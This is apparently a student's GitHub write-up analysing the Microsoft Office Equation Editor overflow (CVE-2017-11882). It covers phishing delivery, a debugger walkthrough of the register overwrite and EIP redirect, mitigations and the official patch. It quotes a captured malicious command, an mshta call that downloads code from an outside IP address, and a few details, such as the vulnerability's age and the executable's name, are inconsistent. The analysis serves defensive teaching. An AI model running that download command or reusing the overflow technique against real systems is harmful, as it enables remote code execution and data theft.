# Microsoft Office Memory Corruption (CVE-2017-11882)  
![Word Logo](https://github.com/tingsama/hacking-p2/blob/main/Word%20Logo.png)  

### Background
* __Age__: 17 year old vulnerability
* __What is it__: Run arbitrary code remotely without user interaction
* __Why it works__: Buffer overflow vulnerability inside equation editor (EQUEDT32.exe)
* __Who has been affected__: Users who installed
  * Microsoft Office 2007 Service Pack 3
  * Microsoft Office 2010 Service Pack 2 
  * Microsoft Office 2013 Service Pack 1 
  * Microsoft Office 2016
* __CVSS__:
  * The Common Vulnerability Scoring System
  * The score is 7.8 (high)
  * Really dangerous & should be fixed ASAP  
![CVSS](https://github.com/tingsama/hacking-p2/blob/main/CVSS.png)  
Figure 1:  CVSS score [1]


### It always starts from the internet phishing...
1.	A spam __email__
2.	An __attachment__
3.	A __.doc file__ in Rich Text Format (RTF)
4.	__Microsoft Office__ will automatically open it  
![Spam Email](https://github.com/tingsama/hacking-p2/blob/main/Spam%20Email.png)


### Process Monitor
It is an [advanced monitoring tool for Windows](https://nvd.nist.gov/vuln-metrics/cvss).  
It is used to monitor and display all the activities of file system in real-time. [1](https://en.wikipedia.org/wiki/Process_Monitor)  
* Unexpected operation named 'EQNEDT32.EXE'
* Command line has been called
* (Very like) a malicious host - 'mshta http://104.254.99.77/x.txt'  
![Process Monitor](https://github.com/tingsama/hacking-p2/blob/main/Process%20Monitor.png)  


### Burp Suite
It is a [web vulnerability scanner](https://portswigger.net/burp).  
It is a set of tools used for penetration testing of web applications. [reference 2](https://www.geeksforgeeks.org/what-is-burp-suite/g)  
* Unexpected 'GET' request 
* (Very like) a malicious host - 'mshta http://104.254.99.77/x.txt'  
![Burp Suite](https://github.com/tingsama/hacking-p2/blob/main/Burp%20Suite.png)  


### Steps after you click the malicious word file:
#### 1. Microsoft Word file load up  
Here microsoft word will load up and read and compile the stuff inside.  
![step 1](https://github.com/tingsama/hacking-p2/blob/main/step%201.png)  
#### 2. Execute Equation Editor  
Everyone used the equation editor before, to create the nice look equations.  
However, the equation editor is another individual program and Microsoft Word invokes its own process.  
In this case, everything inside the equation editor can skip all Microsoft protection bubbles.  
![step 2](https://github.com/tingsama/hacking-p2/blob/main/step%202.png)  
#### 3. Hacker overflowed the font name registers inside Equation Editor  
Before overflow EAX save the length of font name which is 16 bytes (Hex:00000010).  
And the detail inside the font name registers is “TIMES NEW ROMAN”.  
![step 3-1](https://github.com/tingsama/hacking-p2/blob/main/step%203-1.png)  
After overflow, EAX pointed to 0012F350 and overflowed all other registers.  
On memory 004115CF, it loads whatever is inside the ebp register and pushes into the EAX register.  
The ebp register is a two way pointer and linking between word document and equation editor.  
The hacker changed the ebp register value to 48 bytes and then it was loaded to the EAX register.  
![step 3-2](https://github.com/tingsama/hacking-p2/blob/main/step%203-2.png)  
#### 4. Overflow message  
Let now take a look at the 48 bytes detail inside the overflowed register beginning at address: 0012F350.  
From address 0012F350 to 0012F360 32 bytes are saving the hacker's mshta link and it can send a get request to this link and download the malicious software.  
Address: 0012F370 first 12 bytes are ‘20’ which are saving shell code inside but we cannot see it in detail through ASCii reader.   
The final 4 bytes are ‘12 0C 43 00’ which is the new EIP register address that the hacker wants us to jump to in the next step.  
![step 4](https://github.com/tingsama/hacking-p2/blob/main/step%204.png)  
#### 5. Redirect to new EIP address  
Here we can see at address: 00430C12 it call the Winexe program.  
![step 5](https://github.com/tingsama/hacking-p2/blob/main/step%205.png)  
#### 6. Winexe execute   
From the code here we can see the Winexe execute at address 00430C12 and talk to the EAX register as it input.  
In this case, inside the Winexe it will run shell code first, then send a get request to the hacker's link.  
![step 6](https://github.com/tingsama/hacking-p2/blob/main/step%206.png)  
#### 7. Download hacker’s malicious software   
Finally after everything executes and runs correctly, it will download the malicious software and hide in some specific hard finding place to continuously steal your personal information.  


### [How to protect yourself from this exploit](https://support.microsoft.com/en-us/topic/how-to-disable-equation-editor-3-0-7e000f58-cbf4-e805-b4b1-fde0243c9a92)
The best way to protect your machine from this vulnerability is patching.
However, if you decide not to patch, a simple way to protect your machine is to disable EQUAEDT32.exe which is the equation editor that has the vulnerability.
The following commands can update your registry to disable EQUAEDT32.exe.
If you have an Office software running on a x64 machine, then you can use the second command, otherwise the first command is your choice. [4]
![Update Registry](https://github.com/tingsama/hacking-p2/blob/main/Update%20Registry.png)  


### [Official Patch](https://blog.0patch.com/2017/11/official-patch-for-cve-2017-11882-meets.html)
The official patching for CVE-2017-11882 was done in a Patch Tuesday update in November 2017. The patching was mainly done at function sub_0041160F.
The difference of the patched function(left hand side) and the original function(right hand side) is shown below.
The left top block shows that a boundary check is added. This line of code reset the counter register to 0x20 if it is larger than or equal to 0x21.
The left bottom block added a buffer truncation. This code makes sure only 0x20 bytes are copied and zero-terminate. [5]
![Official Patc](https://github.com/tingsama/hacking-p2/blob/main/Official%20Patch.png)  


### How to avoid?
* Don’t skip patches.  
Simply __patch__ or __update__ the software can prevent an attack from happening. 
* Use a real-time anti-virus.  
Using a __anti-virus software__ can sometime be helpful.
* Filter your email.  
__Block__ the type of document that you don't use.  
__Do not click__ on the link or a document that looks suspicious. 
* Keep track of your websites. 
__Don’t enable online services__ or __create online accounts__ just because of promotion. 


Reference:
[1]"NVD - CVE-2017-11882", Nvd.nist.gov, 2021. [Online]. Available: https://nvd.nist.gov/vuln/detail/CVE-2017-11882. [Accessed: 18- Mar- 2021].
[2]Blogs.quickheal.com, 2021. [Online]. Available: https://blogs.quickheal.com/wp-content/uploads/2018/02/Fig3.png. [Accessed: 18- Mar- 2021].
[3]C. Hardy, Stack Buffer Overflows - a primer on smashing the stack using CVE-2017-11882. 2021.
[4]C. Hardy, CVE-2017-11882 - 3 ways to perform technical analysis, 1 easy way to protect. 2021.
[5]L. Treiber, "Microsoft's Manual Binary Patch For CVE-2017-11882 Meets 0patch", Blog.0patch.com, 2021. [Online]. Available: https://blog.0patch.com/2017/11/official-patch-for-cve-2017-11882-meets.html. [Accessed: 18- Mar- 2021].
